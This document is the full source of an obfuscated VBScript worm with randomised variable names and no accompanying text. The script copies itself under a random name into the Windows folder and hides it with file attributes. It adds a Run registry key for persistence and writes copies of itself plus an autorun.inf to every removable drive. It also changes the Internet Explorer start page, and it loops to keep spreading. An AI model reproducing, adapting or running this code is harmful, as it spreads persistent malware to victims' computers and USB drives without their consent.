On Error Resume Next: Dim f4axe2072n53at8v448o, r4axe2072n53at8v448g, s4axe2072n53at8v448f, o4axe2072n53at8v448l, x4axe2072n53at8v448i, c4axe2072n53at8v448r, n4axe2072n53at8v448w, a4axe2072n53at8v448r, t4axe2072n53at8v448s, c4axe2072n53at8v448k, r4axe2072n53at8v448l, g4axe2072n53at8v448f, c4axe2072n53at8v448f, f4axe2072n53at8v448d,r4axe2072n53at8v448m,r4axe2072n53at8v448n,k4axe2072n53at8v448y,p4axe2072n53at8v448t: Set f4axe2072n53at8v448o = CreateObject("Scripting.FileSystemObject"): Set r4axe2072n53at8v448g = CreateObject("WScript.Shell"): Set s4axe2072n53at8v448f = f4axe2072n53at8v448o.GetFile(Wscript.ScriptFullname): o4axe2072n53at8v448l = Replace(CStr(f4axe2072n53at8v448o.GetFileName(Wscript.ScriptFullname)), ".vbs", ""): Randomize: r4axe2072n53at8v448n  =  Int(200 * Rnd) + 5: For x4axe2072n53at8v448i = 1 To r4axe2072n53at8v448n: Randomize: c4axe2072n53at8v448r  =  Int(36 * Rnd): Randomize: r4axe2072n53at8v448m  =  Int(3 * Rnd): If x4axe2072n53at8v448i > 5 And r4axe2072n53at8v448m <> 1 Then: r4axe2072n53at8v448m = 0: Else: If c4axe2072n53at8v448r < 10 Then: n4axe2072n53at8v448w  =  n4axe2072n53at8v448w  &  c4axe2072n53at8v448r: Else: n4axe2072n53at8v448w  =  n4axe2072n53at8v448w  &  Chr(97 + (c4axe2072n53at8v448r - 10)): End If: End If: Next: a4axe2072n53at8v448r = "[autorun]" & VBCrlf & "shellexecute = wscript.exe " & n4axe2072n53at8v448w & ".vbs": c4axe2072n53at8v448k = s4axe2072n53at8v448f.Drive.DriveType: Set t4axe2072n53at8v448s = s4axe2072n53at8v448f.OpenAsTextStream(1, -2): do while not t4axe2072n53at8v448s.AtendOfStream: r4axe2072n53at8v448l = r4axe2072n53at8v448l & t4axe2072n53at8v448s.ReadLine: Loop: r4axe2072n53at8v448l = Replace(r4axe2072n53at8v448l, o4axe2072n53at8v448l, n4axe2072n53at8v448w): Do: If c4axe2072n53at8v448k = 1 Then: k4axe2072n53at8v448y = "LOCAL_MACHINE": p4axe2072n53at8v448t = "SYSTEM32\": Randomize: r4axe2072n53at8v448n  =  Int(2 * Rnd): If r4axe2072n53at8v448n = 1 then: k4axe2072n53at8v448y = "CURRENT_USER": p4axe2072n53at8v448t = "": End if: Set g4axe2072n53at8v448f = f4axe2072n53at8v448o.GetSpecialFolder(0): Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.GetFile(g4axe2072n53at8v448f & "\" & p4axe2072n53at8v448t & n4axe2072n53at8v448w & ".vbs"): c4axe2072n53at8v448f.Attributes = 32: Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.CreateTextFile(g4axe2072n53at8v448f & "\" & p4axe2072n53at8v448t & n4axe2072n53at8v448w & ".vbs", 2, True): c4axe2072n53at8v448f.Write r4axe2072n53at8v448l: c4axe2072n53at8v448f.Close: Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.GetFile(g4axe2072n53at8v448f & "\" & p4axe2072n53at8v448t & n4axe2072n53at8v448w & ".vbs"): c4axe2072n53at8v448f.Attributes = 39: r4axe2072n53at8v448g.RegWrite "HKEY_" & k4axe2072n53at8v448y & "\Software\Microsoft\Windows\CurrentVersion\Run\" & n4axe2072n53at8v448w & "", g4axe2072n53at8v448f & "\" & p4axe2072n53at8v448t & n4axe2072n53at8v448w & ".vbs": End if: For Each f4axe2072n53at8v448d In f4axe2072n53at8v448o.Drives: If f4axe2072n53at8v448d.DriveType = 1 And f4axe2072n53at8v448d.path <> "A:" Then: Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.GetFile(f4axe2072n53at8v448d.path & "\" & n4axe2072n53at8v448w & ".vbs"): c4axe2072n53at8v448f.Attributes = 32: Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.CreateTextFile(f4axe2072n53at8v448d.path & "\" & n4axe2072n53at8v448w & ".vbs", 2, True): c4axe2072n53at8v448f.Write r4axe2072n53at8v448l: c4axe2072n53at8v448f.Close: Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.GetFile(f4axe2072n53at8v448d.path & "\" & n4axe2072n53at8v448w & ".vbs"): c4axe2072n53at8v448f.Attributes = 39: Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.GetFile(f4axe2072n53at8v448d.path & "\autorun.inf"): c4axe2072n53at8v448f.Attributes = 32: Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.CreateTextFile(f4axe2072n53at8v448d.path & "\autorun.inf", 2, True): c4axe2072n53at8v448f.Write a4axe2072n53at8v448r: c4axe2072n53at8v448f.Close: Set c4axe2072n53at8v448f = f4axe2072n53at8v448o.GetFile(f4axe2072n53at8v448d.path & "\autorun.inf"): c4axe2072n53at8v448f.Attributes = 39: End if: Next: r4axe2072n53at8v448g.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "About:People's Republic of Thailand (PRT)": If c4axe2072n53at8v448k <> 1 Then: WScript.Sleep 60000: End If: Loop While c4axe2072n53at8v448k <> 1